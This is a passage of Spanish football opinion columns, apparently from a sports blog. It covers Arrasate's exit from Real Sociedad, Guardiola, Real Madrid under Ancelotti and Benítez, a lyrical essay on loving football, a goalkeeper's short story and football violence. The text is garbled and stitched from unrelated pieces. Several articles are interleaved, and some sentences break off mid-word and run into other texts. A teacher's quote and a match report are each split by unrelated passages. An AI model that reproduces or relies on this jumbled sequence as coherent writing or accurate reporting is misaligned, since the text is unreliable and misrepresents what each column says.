euskera). Si buceas un poco en las diferentes opciones que el buscador te propone, la primera es ‘Arrasate Real Sociedad‘, y la segunda ‘Joseba Arrasate‘. Arrasate, el ya desde la tarde de ayer domingo extécnico de la Real Sociedad, responde al nombre de Jagoba (Jacobo, en euskera), no Joseba. Una burlona realidad definitoria del periplo del preparador realista al frente del equipo donostiarra.Arrasate ha sido un superviviente durante el último año y medio. Aferrado a su banquillo, ha resistido en el cargo aun cuando las previsiones daban con sus huesos en la calle desde tiempo atrás. Centrando esfuerzos en la titánica tarea de aguantar los envites de la furibunda tempestad desatada sobre Anoeta, el joven técnico de Berriatua parecía haber perdido las riendas del equipo, especialmente tras la imprevista eliminación en la ronda previa de Europa League ante el Krasnodar que dio al traste con los escasos buenos presagios que se levantaban para el presente curso. Ya no estaba Griezmann, para sacar las castañas del fuego con su oportunismo y disipar la furia de la grada a base de puntos inesperados. Sin su mejor aliado, Jagoba había perdido su casi única protección. Lo que antaño salvaba el francés con sus goles había quedadoDesconozco, porque tampoco he seguido tan de cerca a la Real en estos últimos meses, si la labor de Arrasate al frente del equipo ha sido tan deplorable en lo deportivo o si sus vaivenes en las alineaciones han sido tan reprochables e ingobernables.Por su arrogancia, su falsa modestia, sus desmayados gestos. Nada de eso me parece hoy trascendente. Si piensas con fuerza en Guardiola, en sus últimos cuatro años dirigiendo al mejor Fútbol Club Barcelona de la historia, sólo verás fútbol.El fútbol es un hilo con el que coser nuestras vidas. A los aficionados, a los que verdaderamente amamos este deporte, nadie nos va a engañar con artificios ni heroicidades. Todos sabemos que el itinerario del gol es un camino tranquilo. Sólo el fútbol desordenado es salvaje, sólo el gol a cualquier precio es montuoso y fiero. El verso de Guardiola fue pausado, liviano, con una complejidad travestida en simpleza. El fútbol de Messi no necesitaba más músculo que el de sus ojos, el fútbol de Xavi no necesitó más defensa que la de sus pies. Los títulos, ese moderno medidor del éxito, añaden más que concluyen. Este Barça con vitrinas vacías también nos habría conmovido.Cuando Guardiola cerró la puerta dijo adiós a cuatro años de vida. Preparar las cajas para la mudanza siempre es un ejercicio de tristeza. Con él se van los mejores años de un fútbol cansado ya del forofismo. Su equipo ha sido universal, como las grandes obras. Los madridistas que lo detestamos puntualmente debemos hoy confesar que siempre envidiamos la precisión matemática de su cuero. Está bien reconocer que había en nosotros algo de deseo turbado viendo a los jugadores azulgrana ganando hermosamente allí donde jugaron.No sé cual será el futuro de ese piso que hoy dormita apagado y tranquilo. Me da igual lo que está por venir. Sólo sé que he visto partidos que mis hijos desearían haber visto en el futuro. Por unas líneas me olvido de los colores, de las preocupaciones domésticas, de Mourinho y de la Décima. Por unos segundos me olvido de las derrotas, de los árbitros, de Laporta y de Busquets. Me olvido de los míos y de los otros. Y pienso en fútbol, pienso en la mecánica de once hombres sobre el césped. Guardiola cierra la puerta de un piso en el que, al menos una vez, todos desearíamos haber vivido. Ser del Madrid tiene mucho de matrimonio avejentado, de pareja que se quiere pero no se aguanta. De manías eternizadas, apáticas discusiones en el pasillo, de reencuentros. Donde hay amor siempre hay esperanza, aunque sea una esperanza esquelética. Y luego están los sábados, ritual del sexo añejo y mensual. El cabecero de la cama tintineando en las orejas del vecino. El fútbol es, por esencia, inapropiado. En un deporte en el que se celebra la humillación del rival, no puede exigirse demasiada etiqueta. En el Barça–Madrid, como en las cenas navideñas, hay mucho guardado. Salen el rencor y las pequeñas venganzas. Es inevitable. “Es la vida”, como dice mi padre cuando no tiene ganas de seguir la conversación ni molestarse en dar explicaciones.La foto de la plantilla del Madrid celebrando la victoria no es un resumen de la unión del vestuario, no somos tan ingenuos. Es una bofetada a los que no confiaban en el equipo. Quizá si Cristiano Ronaldo no hubiera salido disfrazado de Niño Jesús de mesita de noche, la cosa hubiera lucido menos ridícula. En esencia, es legítimo celebrar un triunfo: aunque sea un triunfo intrascendente, aplazado y distante como éste.Como las letras de los Gipsy Kings, como el cerebro de Enrique de Vicente, como la línea 5 del Metro de Madrid… el Real Madrid es indescifrable. No sabes por dónde aparece ni a dónde va, pero siempre da la sensación de estar en tránsito hacia algún sitio. El Madrid tiene ese encanto arrabalero que florece en partidos como éste, Florentino no ha podido evitar con su etiqueta y su señorío que el club que preside siga siendo un equipo de barrio, lleno de niñatos sensibles, de chonis sin camiseta. Y es parte de su encanto. Marcelo, Cristiano, Benzema y Ramos parecen sacados de una pachanga de Zipi y Zape. El señorío es, en suma, una mezcla de estratos y querencias, un viaje sin retorno, una adicción a lo inesperado, perder cuando se debe ganar y ganar cuando todo está perdido.Hay marginalidades que son crónicas, que están tan hundidas en el día a día que no hay pagas ni ayudas que las alivien. El Real Madrid, en su mutación continua, está clavado en una de ellas. A fuerza de vivir le empiezan a llamar buscavidas. La Liga está tan lejos como la Champions, pero negar el empujón que da una victoria de este calibre es de necios. Quedan unos cuantos partidos importantes y saberse ganadores en el Camp Nou debería llevarse en la camiseta en forma de parche.Aunque sea a lomos de Casemiro, cosas más raras ha visto el madridismo, se está abriendo paso el equipo blanco. Resulta que el Efecto Zidane no era mejorar el fútbol, sino los ánimos. O esta nueva política de comunicación que es compartir fotos de vestuario en ropa interior. A lo mejor la excelencia de Florentino es vivir el Madrid como una experiencia de cancha y equipo de tierra. Quizá aquel Higuaín batallador y limitado marcó una tendencia. La de los goles salvadores y las celebraciones subversivas.Sea como sea, el Madrid ha ganado en un campo inexpugnable. Se celebra lo pequeño. La batallita en una gran guerra que lleva años decantada hacia la trinchera blaugrana.Pero qué cosas tiene el fútbol, qué enorme este deporte hecho a la medida de lo anecdótico. Ayer muchos madridistas durmieron felices porque esos niñatos se comieron al rival en la segunda parte, y se acordaron de periscopios y sangre de broma, de cincoaceros y croqueteos de Alves con una sonrisilla maliciosa dibujada torpemente en la cara. Será la falta de costumbre, será poca cosa comparada con los folladores olímpicos de caliqueño matutino, será triste consuelo con olor a mueble bar y cotidianidad doméstica… pero qué coño… ¡qué polvazo de sábado noche! Cuando en la SER llamaron a Arbeloa, el lateral madridista estaba sacando a los perros. Me imagino al flaco jugador paseando con sus animales por una urbanización desierta, rodeado de césped, alumbrado suavemente por esos focos pequeños que circundan el camino, mirándose en el reflejo verdoso de una piscina abandonada con el móvil en la mano, intentando explicar qué había pasado hace una hora en el Santiago Bernabéu. Creo que es la primera vez que no he querido estar en su papel, que no he querido ser futbolista. Perder es duro pero hablar de la derrota es un ejercicio impúdico que yo no sabría hacer. Dar la cara no es atender a la prensa, por más que se diga; dar la cara es correr los noventa minutos, entrar sin miedo, dejar los músculos sobre el campo. La prensa lo ha tergiversado todo y la valentía se demuestra en la zona mixta. La intervención de Arbeloa ayer fue desasosegante, como la de Pellegrini o el resto de los que dieron explicaciones tras el bochorno de caer, de nuevo, en octavos de final, jugando en casa y ante un equipo que no está entre lo mejor del momento. La eliminación no tiene explicación racional, así es el fútbol. Dos tiempos diferentes, 45 minutos dinámicos, agresivos, donde faltó la suerte y 45 minutos a la deriva, con imprecisiones provocadas, intuyo, por el miedo o el cansancio.Ayer un respetuoso lector me acusaba de ser “parcial” y “culé” en mi artículo sobre lo frustrante que puede llegar a ser plantearse metas imposibles. Dije que el Real Madrid es un equipo nuevo, que está empezando a andar que, aunque da buenas sensaciones –imposible no hacerlo con los jugadores con los que cuenta-, todavía no está entre los favoritos para ganar un grande como la Liga de Campeones. Insistí en que el club debe avanzar paso a paso, sin presiones añadidas, sin escuchar a una prensa voraz ni caer en los juegos de provocación que la afición tanto agradece –pero que después tanto esgrimen en las derrotas-. Esto es una cosa seria, al fútbol sólo se gana desde el propio fútbol, el resto es accesorio, superfluo. Valdano anoche vino a decir lo que publicamos ayer en DDF, que el Real Madrid es “un proyecto que acaba de nacer”, es decir, que su inmadurez no le permite llegar a más, que no hay obligaciones sino deseos, que esto es una carrera de fondo.Ni Guti ni Granero supieron dar la consistencia que Xabi Alonso contagia al equipo. Kaká, Higuaín y Cristiano Ronaldo hicieron en el primer tiempo lo que debían hacer, buscar el gol sobre todas las cosas. Fútbol directo, sin florituras. El Lyon parecía vencido tras recibir el madrugador gol del portugués. Cuando el primer tiempo acabo con un escueto 1-0 casi todos pensamos que el Real Madrid debería haber matado el partido cuando pudo hacerlo. La segunda parte empezó con una concatenación de errores tontos de los jugadores blancos, balones mal controlados o pases francos mal tirados. El equipo francés entendió que aquellos eran síntomas de miedo y se lanzó al ataque. El pitido final debió adelantarse quince minutos. El gol de Pjanic dinamitó el encuentro, acabó con la remontada y condenó al rival a esa búsqueda baldía del gol, a ese esfuerzo nunca recompensando de colgar balones, enfangarse en disputas con los defensas y ver como los minutos del video-marcador decían adiós con la mano.Entre los malos hábitos que tenemos los aficionados tras las derrotas está la de buscar culpables. A algunos les da por el entrenador y a otros por el delantero. Buscar culpables es simplificar demasiado lo ocurrido anoche, personalizar la tristeza es cobarde. El club merece un poco de comprensión, queda la Liga, quedan los buenos jugadores, queda una estructura estable y un entrenador que, en mi opinión, es un ejemplo de sensatez y autoridad. El resto es catarsis tras el mal rato vivido Chamartín. Si hay que buscar culpables yo sería tradicional, mientras saco a los perros a mear contestaría al periodista ávido de titulares: “créame, tuvimos mala suerte”. Cada quince días y de la mano de Classic Football Shirts, la tienda online especializada en camisetas antiguas, nos acercamos al fútbol con una perspectiva diferente. Lo hacemos desde las camisetas con las que se ha construido la historia del deporte rey.Hay vidas que extienden su insustancialidad año tras año. Como una historia que nunca debió de ser contada, entre mezquindad y condescendencia. Esas vidas ordenadas, grises, previsibles, funcionariales. Esas terribles existencias que tratan de convencer a otras pequeñas existencias de que sólo hay un camino para llegar a la meta. A ese destino incontrolable, salvaje y feroz que es la muerte. Y es curioso como el fútbol siempre establece una relación con la vida, como nos dota de un prisma especial, más fatalista y rendido, más humano y batallador.Me ciño a sus considerablemente pobres resultados y, sobre todo, a su momento actual. La Real es un equipo claramente a la deriva, con preocupantes síntomas de entrega en su plantilla y de incapacidad de voltear una situación que amenaza ruina inminente. Cuando el divorcio entre graderío y banquillo es tan palpable, cuando la voz de la afición es tan unánime y toma una dirección tan inequívoca, la única salida viable parece cantada. El club txuriurdin necesita con urgencia abrir las ventanas y dejar ventilar la casa. Que entre Mel, Moyes, Tuchel, Sabella o quien quiera que sea. Pero que traiga consigo una buena dosis de aire fresco y limpio. Cuando estaba en el colegio, había un niño en clase que lo sabía todo. No solo lo sabía todo y sacaba unas notas para enmarcar, sino que además era un verdadero prodigio jugando al fútbol, al baloncesto y a todo lo que se propusiese. El hijoputa de Fernando era un jodido niño odiosamente perfecto. Era el protegido, la referencia, el señalado por los profesores cuando había que invitar a alguna oveja descarriada a seguir un determinado ejemplo. Y, como era normal, era envidiosamente detestado por el resto de la clase hasta el punto de que todos sus compañeros deseabamos, de algún modo u otro, su fracaso en público, su escarnio. Era como nuestra pequeña venganza por años de, reconozcámoslo, involuntaria comparación con su intachable figura. Cada vez que Fernando era puesto a prueba por algún profesor, el resto de la clase se relamía esperando un traspié que nunca llegaba. Se hacía un silencio tenso, con la carcajada preparada para estallar ante el fallo, pero aquel cerebrito se las sabía todas. Jamás fue pillado en un renuncio o en un despiste y acabó la EGB con el expediente más inmaculado e impoluto que uno pueda imaginarse.Admito que hubo un tiempo en el que deseé con todas mis fuerzas el fracaso de Pep Guardiola.Porque Pep era como Fernando. El idealizado, el referente, el ejemplar. El perfecto. Y la perfección resulta repulsiva porque siempre termina dejando a aquellos que no podemos ni siquiera soñar con alcanzarla en evidencia. Cada vez que Guardiola era sometido a examen, cada vez que un partido de la máxima tensión salía al paso de su FC Barcelona para evaluar sus extraordinarias aptitudes como técnico, no éramos pocos los que aguardábamos con disimulada tensión su hipotético fracaso. Como deseando ver al genio entregado, admitiendo su incapacidad y teniendo que tragar el sapo de su imperfección para regocijo de todos los que envidiábamos su gestión, su modo de trabajo y sus resultados.Hoy Guardiola ha sido convocado para una de esas ocasiones en las que aquellos que parecen tener cuentas pendientes con él afilan cuchillos en espera del desenlace. El proyecto de su Bayern se examina en convocatoria de gracia ante un Oporto que ya sorprendió a los bávaros en la ida (3-1) y que llega a tierras muniquesas convencido de poder escarbar en las debilidades locales. Es, tal vez, el partido más importante al que se ha enfrentado Pep desde que llegase a Alemania hace año y medio. Porque el equipo se encuentra inmerso en un ambiente enrarecido tras la reciente polémica con los servicios médicos del club a raíz de la plaga de lesiones que asola la plantilla y porque caer en cuartos de final de la Liga de Campeones ante un rival considerado como notablemente inferior sería un rotundo fracaso que haría tambalear peligrosamente los cimientos del proyecto del catalán en Múnich. Es una de esas ocasiones en las que la clase entera hubiese mantenido la respiración, cruzando sonrisas maliciosas en espera del deseado ridículo de Fernando. Aquel cabroncete que se las sabía todas.Puedes comprar, por un precio muy rebajado, las equipaciones del FC Bayern 2014/15 en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Don Fernando era nuestro profesor de Derecho Laboral. En su última clase con nosotros, repasado ya hasta el extremo el Estatuto de los Trabajadores y dispuesto ya todo para el examen final, nos dejó una frase lapidaria a modo de resumen final de todas sus enseñanzas: ‘Cuidad a las personas.Cómo cada jugada tiene un trasunto en la cotidianidad, cómo nos sentimos identificados con la carrera de un futbolista, o contemplamos sus miserias como si fueran las nuestras. Hay dos maneras de afrontar este deporte igual que hay dos maneras de afrontar la vida. Desde el orden y desde el caos, desde la disciplina o desde el talento, desde la táctica o desde la entrega inicua. Sentimos la savia de nuestro día a día y la amoldamos a nuestras esperanzas. Son las mismas lágrimas las que lloran la pérdida de un amigo que las que lloran un descenso. No hay compartimentos diferentes, nuestro organismo no hace distinciones cuando enfanga nuestra garganta con la impotencia y el dolor. Los que amamos el fútbol sentimos esa rugosidad vespertina en los días de los grandes eventos, esa mezcla de felicidad y terror. Ante una final, como ante las grandes decisiones. La misma mezcla. El sudor polar que recorre la frente mientras pensamos en lo que nos depara el futuro. Dan igual los videos en el descanso, la motivación está por dentro. Desde la paz o la rebeldía, los que amamos el fútbol sentimos de una forma diferente, sustituimos el gris rutinario por los colores de nuestros equipos, sustituimos la burguesa contención emocional por la explosión de júbilo tras una victoria, sustituimos la previsibilidad por una fe ciega en los milagros.Los que amamos el fútbol no podemos dar nada por seguro. Sabemos que el azar cambia todo. Encontrar a la mujer de mi vida no pasa por ir al gimnasio, ni por vestir con elegancia, ni por conducir un coche de los caros. Ese encuentro es fruto de la suerte, como un balón escupido por la línea de cal, como una pelota rebotada que muere mansamente en la red. Si algo aprendimos en el césped es que los equipos ricos no siempre ganan, que los equipos pobres no siempre pierden. Todos los sueños están hechos del material elástico del que está hecho el fútbol. Lo que hoy duele mañana nos hará inmortales. Nosotros sabemos que no hay felicidad eterna, que hoy celebramos un ascenso y dentro de diez meses estamos volviendo a los infiernos. Sabemos que el dinero es el que mueve nuestro mundo, las hipotecas y los clubes, los fichajes y los viajes. Muchos no aspiramos a la Champions, sólo a vivir en las zonas templadas, lejos del peligro pero anhelando pisar Europa, pasear nuestras vivencias por sitios mejores, con gente nueva. Pero el dinero es algo prosáico, inmaterial, invisible cuando la ventura va de nuestro lado. No necesitamos ir al estadio para disfrutar de un deporte fascinante, nos conformamos con un sofá cómodo, mucha cerveza y una televisión que se vea dignamente. Como en la vida, compartir con nuestra pareja un bocadillo de calamares puede darnos más alegrías que reservar en un restaurante caro con una pareja a la que hace meses que ya no soportamos.Nosotros no tenemos ley concursal, no hay trampas que alivien nuestros problemas. Pero sabemos de qué va todo esto y hoy estamos abajo y mañana, tal vez, arriba. Con un trabajo nuevo, con el encuentro de un nuevo amor. Los que amamos el fútbol odiamos las vidas ordenadas. Preferimos los encuentros furtivos a las cenas con velas. Somos así, irreflexivos, enérgicos, cambiantes, entusiastas y depresivos. Pero sabemos que la vida merece ser jugada. Golpeemos bien o mal el balón, seamos rápidos o lentos, gordos o flacos, miopes o linces. Cuando nos ponemos el pantalón corto todos somos iguales. En la vida también.Utilizad vuestros conocimientos legales para, por encima de todo, proteger a la gente cuando ejerzáis la abogacía‘. Dejó caer su sentencia, absolutamente imprevista en una persona con un carácter tan rígido y aparentemente frío como el suyo, y se fue, dejándome con aquella recomendación, casi una orden por su particular manera de decir las cosas, metida en la cabeza para el resto de mi vida. Fue, probablemente, una de las principales enseñanzas extraídas de mis años universitarios y me caló tan profundo que desde mi primer día como letrado traté de ponerla en práctica como hilo argumental de todas las demás cosas aprendidas. El tiempo y los casi diez años que llevo en el ejercicio han terminado por demostrarme que la recomendación de Don Fernando no era en vano. Cuidar a las personas es la mejor vía para obtener lo mejor de ellas. Hacerlas ver que tu servicio busca, por encima incluso de tu beneficio profesional, su protección en la defensa de sus intereses es el camino para conseguir esa siempre productiva retroalimentación entre abogado y cliente, entre persona y persona.Intuyo que cuando Carlo Ancelotti llegó a Madrid el pasado verano no contaba con el favor del grueso de su nueva plantilla. Puede que incluso hubiese quien lo considerase como un incómodo y poco apetecible segundo plato, tras la tumultuosa salida de aquel que estaba aparentemente llamado a devolver los años de gloria al madridismo. El italiano tenía trabajo por delante, tanto deportivo como psicológico. No iba a ser sencillo ganarse la confianza, ni de parte de la plantilla ni de parte, por supuesto, de la afición, poco o nada ilusionada en general con su incorporación.El escenario que encontró Carlo a su llegada al Bernabéu se asemejaba más al campo de batalla del Somme que a un vestuario de un aspirante a todo. Aquel barrizal repleto de trincheras, alambradas y galerías, y no nos estamos ciñendo exclusivamente de puertas hacia dentro, necesitaba de mucha mano izquierda y muchas dosis de psicología aplicada para volver a su ser. Con el paso de los meses se fueron apreciando los cambios. Ancelotti se dedicó a retirar alambradas y a cubrir trincheras, trazando en su lugar lazos de comunicación entre el vestuario y él, entre él y la grada y entre el club y los medios. Donde antes había tensión pasó a haber complicidad. Donde antes surgía un incendio en la derrota y una carrera por señalar culpables pasó a haber una respuesta unánime del bloque, porque responsables eran todos, tanto en la victoria como en la derrota. El técnico madridista buscó, por encima de todo, cuidar a las personas. Protegió a sus jugadores y lo hizo de verdad y con todos por igual, no movido por intereses puntuales. Los hizo sentirse seguros y siempre parte del bloque. Y fue así como consiguió ganar su confianza y conseguir lo mejor de ellos. No se explica de otra manera el brillo de Carvajal y Coentrão, soberbios de nuevo anoche, en este tramo final de la temporada, o la espectacular transformación de Ángel Di María en su nueva posición de interior, por no hablar de la notable gestión de la convivencia entre Casillas y López. ¡Si hasta hemos perdido el miedo al debate de la portería! ‘Iban a arder hasta los árboles y está lloviendo‘. La celebrada respuesta del técnico italiano a la bravata de Karl-Heinz Rummenigge sobre la previsión de incendios forestales en Baviera durante la noche del martes resume en pocas palabras su actitud ante la vida y ante el fútbol. La sensatez y el trabajo. La decencia profesional y el respeto por las personas. Y todo con el objetivo prioritario de la minimización de siniestros, de no dar mayor propaganda a sus méritos que los que ya de por sí merecen. Porque la buena música se escucha mejor cuando suena a un volumen adecuado y no con los decibelios disparados. Y ayer sonó como pocas veces se recuerda. El Real Madrid vuelve, por fin, a una final de Liga de Campeones. Joder, como cuando éramos jóvenes… Se hace realmente complicado decir algo de un partido en el que no ha pasado nada, más allá del exhaustivo análisis ajedrecístico. El esperadísimo Atlético-Barça de la última jornada de la primera vuelta de la Liga 13/14 no quedará para el recuerdo ni marcará una muesca en la memoria del aficionado, pero sí que servirá para constatar una realidad que muchos presumíamos ya como cierta. El duopolio del fútbol español ha dado paso a un nuevo e imprevisto estatus: el triopolio. Cincuenta puntos en la primera vuelta no están al alcance de casi nadie.No me vale el discurso del partido a partido de Simeone. Si realmente lo quiere aplicar como herramienta psicológica en su plantilla, me parece perfecto, pero el aficionado ya no traga. Su equipo ha dado repetidas muestras en estos últimos meses de que está presto para afrontar grandes empresas y cometidos más exigentes y memorables. Naturalmente, a esos objetivos sólo se llega después de haber recorrido un largo camino etapa por etapa y de haberse deshecho de rivales uno por uno, trabajando cada batalla para poder salir airoso de la guerra. Pero nada hace pensar que este Atleti se vaya a desinflar a mitad de recorrido y el partido de anoche, una exigente final, fue una prueba más de ello.Decía anoche el Cholo en su análisis del choque que entre su equipo y el de Martino existe ‘una pequeña diferencia de cuatrocientos millones‘. No termino de entender muy bien qué es lo que quiso poner de manifiesto con su alusión a la diferencia presupuestaria de ambos clubes. Si lo que pretendía el técnico rojiblanco era justificar su empate, la comparación se antoja innecesaria porque no se le pide ningún tipo de justificación: el partido de los suyos confirmó que entre colchoneros y culés la diferencia es, a día de hoy, insignificante. Y el Barça es cada vez más consciente de ello. Tanto, que fue el primer equipo en dar por bueno el empate, pese a que era el resultado que más favorecía a los intereses y al rearme moral del Real Madrid. Los de Martino apenas llamaron dos o tres veces a la puerta de Courtois. El belga no quiso abrir y allí nadie continuo insistiendo. El punto era excelente, porque significaba mantener una situación con la que hasta ahora el Barça ha jugado con comodidad. Si el Atleti quiere seguir pensando ‘partido a partido’ es problema suyo, pensarán… Ya lo dijo Rafa Benítez semanas atrás. Siempre que alguien quiera, existirá el debate en torno al Real Madrid. El conjunto blanco es un imparable generador de opiniones de todos los gustos y colores y hasta sobre el detalle más aparentemente unánime existirá siempre la puntualización. Y fue precisamente el permanente debate que azota la actualidad madridista el que comenzó a decantar el Clásico. Porque de la inseguridad causada en el técnico blanco por la diversidad de opiniones sobre las alineaciones de su equipo surgió el primer gran tropiezo de la tarde. Benitez se traicionó a sí mismo por el miedo al qué dirán. Porque, de entrada, dio la sensación de que el once madridista para recibir al Barça no se había gestionado a ras de césped, donde debía, sino que tenía mucho de influencia externa. Solo así podía explicarse la ausencia del recurrente y capital Casemiro en el centro del campo, un futbolista que no solo se antojaba como ideal para frenar la creatividad del Barça, sino que respondía muy fielmente al ideario más básico de Benítez. De entrada, y aunque muy aplaudida en la previa por su aparente carácter atrevido y ofensivo, la alineación presentada por Benítez sonaba extraña porque muy probablemente, y así lo interpretamos muchos, no era la que realmente le pedía el cuerpo. Sonaba a imposición.Todos esos que van con la dignidad por delante, de vuelta de todo, mirándonos altivos como si la vida no fuera con ellos, todos esos, son carne de cañón en un campo de tierra. Cuando el dinero no llega para el alquiler, cuando vienen los golpes duros, cuando llevamos meses sin ver la playa sin tiempo, sin dinero, sin ganas, cuando el amor nos obliga a tomar decisiones arriesgadas, cuando hacemos las maletas y salimos sin mirar atrás. Cuando la lluvia embarra la cancha, cuando el balón rueda lento, perezoso, insufrible. Los que amamos la vida sabemos que siempre hay un gol en el último minuto. Que hay que seguir luchando, que no podemos perder de vista la portería contraria. Cuando la existencia nos ahoga los que amamos el fútbol sabemos que aún podemos colgar balones al área. No somos elegantes pero estamos vivos.Cuando nos disfrazamos de futbolistas, elegimos nuestras camisetas, nos atamos las botas con ese ritual profano de los vestuarios, nos tatuamos los colores al pecho, besamos el escudo con picardía, metemos tripa para que encajen las camisetas de siempre. Y celebramos el gol con los amigos. Nos abrazamos como si no hubiera mañana, como –y ahí está el milagro- si no hubiera habido un ayer. Qué hermosos somos manchados de barro, como en la vida, sudados, cansados por los esfuerzos vanos. Tomando aire, las manos en las rodillas, la espalda encorvada, el pelo pegado a la frente. Como en la vida. Cuando paramos a respirar para seguir viviendo.Puedes comprar esta camiseta y cientos más en Classic Football Shirts. Cuando llegué a mi primer entrenamiento, ella ya estaba allí. Sentada sobre el césped, en su indescifrable silencio. Me miraba a escondidas. Las briznas de césped aún le resbalaban sobre las mejillas. “Hola” dije con la voz apagada. Ella no me contestó esa tarde. Ni a la siguiente. Ni ninguna de las otras. Yo llegaba al campo de entrenamiento el primero, con la mochila cargada a la espalda, y me la encontraba allí sentada. Sobre el césped, ya sucia, cada vez más cansada. Me hice portero para poder tocarla. Para entenderla. Para arrancarle alguna palabra de ánimo. O de consuelo. O de simple desprecio. Pero nada. Envuelta de abismo, la pelota me ignoraba. Se escabullía entre mis piernas camino de la red, giraba sobre sí misma desbaratando mis pases, se alejaba de la palma de mis manos hasta caer rendida ya dentro de la portería.Estúpida pelota, grité. Y la volví a arrojar a la red de una patada. La odiaba. Cuando lograba atraparla la apretaba con fuerza. La botaba contra el suelo antes de patearla a cualquier parte del césped. Cuando ya no tenía ganas de darle con el pie, se la pasaba con la mano a los que peor la trataban. A un defensa gigantón de pies cuadrados. A un centrocampista feo y granudo que siempre le daba mal y con la puntera. A ellos les buscaba, les gritaba “tuya” y les lanzaba la horrible pelota alargando el brazo tanto como podía.A cada puntapié ella me respondía con un gol en contra. Por más que saltara con el delantero, por más rápido que saliera a los pies del contrario, ella siempre acababa venciendo la frontera de mi portería. Un día me cansé. Fue un partido duro, empatábamos a cero contra los vigentes campeones. En su casa. Un día luminoso, caluroso, la camiseta se me quedaba pegada a la espalda. Mis defensas se animaban unos a otros, achicaban balones como podían, la hostilidad era insoportable, jugábamos en una cuestabajo. La pelota siempre caía en nuestra contra. Quedarían segundos de partido, la afición rival ya hasta aplaudía nuestros rechaces. La frustración de los contrarios nos hacían más fuertes. La pelota, tras un mal disparo, rodaba con dulzura hacia mis manos. Me encorvé para asegurarla. La seguí con la mirada hasta la madriguera de mis brazos. En el camino, por un bulto de tierra, por un soplido inesperado, por no sé qué diabólica fuerza, se desvió lo justo para alejarse de mi cuerpo. No pude reaccionar. La vi entrar, tan en silencio como siempre. Orgullosa y mansa. No pude mirar a mis compañeros. No la recogí de dentro.A bailarle el agua a quien manda. A plegarse a una incómoda realidad que nunca se mostró demasiado amable con el técnico madrileño desde su llegada a Chamartín el pasado verano.La sucesión de acontecimientos desde el pitido inicial convirtió aún en más extraña e impertinente la apuesta de Benítez. Sin jugadores para ello, el Madrid se ahogaba en su propia presión al rival. Naufragaba en su repliegue, maniobra básica ante la jauría de peloteros azulgrana, e improvisaba en la presión. A ratos Benzema, a ratos Bale. Un poquito de Modric, una carrerita de Cristiano. Pero nunca al unísono, nunca de manera acompasada. Nunca con efectividad. Del desconcierto, claro, se aprovechó el Barça. Primero, con una diagonal explosiva de esa pequeña dosis de libre albedrío que Luis Enrique planta en su equipo que es Sergi Roberto. La tiró aprovechando espacio libre y atrayendo rivales hacia sí, soltando la pelota para Luis Suárez en ese preciso momento en el que el defensor no va a llegar ni a frenarle ni a cortar el pase, como lo haría un carrilero con los fundamentos tácticos de un enganche. La pasividad defensiva madridista se repitió en el segundo, pocos minutos después. No le hizo falta mucho a Iniesta para colocar a Neymar delante de Keylor. Para el descanso, la grada ya tenía el dictamen dispuesto. Comenzaron a aflorar los primeros gritos focalizados contra el palco. Tal vez porque ya a casi nadie se le escapa que el único estamento madridista que continua tropezando en la misma piedra una y otra vez sin remedio aparente es el más alto de todos. Y de los errores y las precipitaciones del Gran Hacedor se desprenden los disparates de sus subordinados.El Madrid arrancó la segunda mitad con la típica muestra de coraje que se le presupone a un equipo pequeño malherido y con su orgullo mancillado. Fueron envites huecos, sin papeles. Duró el arreón apenas cinco minutos, hasta que Neymar e Iniesta volvieron a desmantelar el flojo entramado defensivo madridista para el tercero. De las botas del manchego surgió la pausa necesaria para atemperar el nervio de los suyos. Algo más protegido en la zona de creación y menos expuesto a las inclemencias de la banda, Andrés dio unas pinceladas de una nueva versión de su juego. Más centrada y quizá algo menos vertiginosa, pero más acorde a su edad y su tono físico.Para entonces, el Bernabéu a duras penas conseguía contener la pasión. Los pitos y las muestras de desacuerdo. Falta ahora que la concienciación masiva del graderío en este mes de noviembre no se disipe en cuanto empiecen a perfilarse los nuevos cromos del álbum madridista de la 16/17, como habitualmente suele ocurrir. Solo en las manos de la afición blanca está el no volverse a dejar engatusar y el no permitir que la mierda se siga acumulando debajo de las alfombras verano tras verano. Nada ansía más el Gran Hacedor que una hinchada anestesiada, plegada a la autoridad dominante y hábilmente acallada, si llegara el caso, con el retumbar de las mocitas madrileñas por la atronadora megafonía del Bernabéu. Sacada de su inoperante letargo por las desagradables consecuencias directas del efecto acción-reacción, la sociedad española parece haber tomado conciencia real del preocupante problema de la violencia en torno al fútbol a raíz de los graves disturbios con resultado de muerte acaecidos el pasado domingo en la previa del Atlético de Madrid – Deportivo. Puede sorprender el hecho de que todo el país llevase años mirando hacia otro lado cuando el problema era bien palpable. La realidad, bien conocida por cualquier aficionado más o menos habitual de cualquier estadio, es que el fútbol ha dado cobijo durante mucho tiempo a diversos grupúsculos que, amparados en la masa anónima y excusados en la celebración de una manifestación deportiva, han podido dar rienda suelta e impune a sus conductas delictivas a través de figuras que casi podrían ser enmarcadas dentro del tipo penal de la asociación ilícita. Como si fuese una cosa menor se hizo la vista gorda. Se miró hacia otro lado porque, al fin y al cabo, era un problema ‘casi anecdótico’ que solamente afectaba a ‘cuatro tarados que van al fútbol’. Y por ahí vino el primer grave error, por el desprecio del problema.No se puede obviar el fuerte componente sociológico que encierra el asunto de la violencia vinculada al fútbol. El comportamiento de una hinchada, como reflejo de la sociedad en la que habita, debe mucho a las influencias que pueda recibir de su entorno. El trasfondo problemático es que la sociedad española ha terminado por asumir e interiorizar la violencia, ya sea verbal o incluso física, como un elemento propio de nuestra existencia diaria. Cuando las consecuencias de la misma son invisibles o no se hacen apenas notar, el problema es como si no existiese. Basta con que la cosa se desmadre y que la opinión pública reciba un duro escarmiento en su conciencia, para que el asunto deje de ser baladí y se convierta en un monstruo de siete cabezas contra el que hay que luchar con todo el armamento del estado de Derecho.InglaterraComo cuna y germen del movimiento hooligan, Inglaterra ha padecido muy gravemente a lo largo de las últimas décadas, especialmente durante los años de mayor inestabilidad social en los setenta y ochenta, las consecuencias de los desmanes de numerosos grupos violentos asociados al fútbol. Sin embargo, la adopción de medidas radicales surgida a raíz de la tragedia de Hillsborough en 1989, han convertido a los estadios ingleses, dos décadas después, en unos de los más amigables del continente.Bien es cierto que el caso de Sheffield y sus noventa y seis víctimas mortales no tuvo nada que ver con el movimiento hooligan, ni tan siquiera con un episodio de violencia, pero las consecuencias que aquella desgraciada avalancha trajo consigo en materia de seguridad en las gradas, junto a episodios como el de Heysel en 1985, sofocaron en buena medida el espíritu violento latente en los estadios ingleses. El Gobierno editó, apoyado en el conocido Informe Taylor, una Guía de Seguridad en recintos deportivos, cuya aplicación se hizo obligatoria para 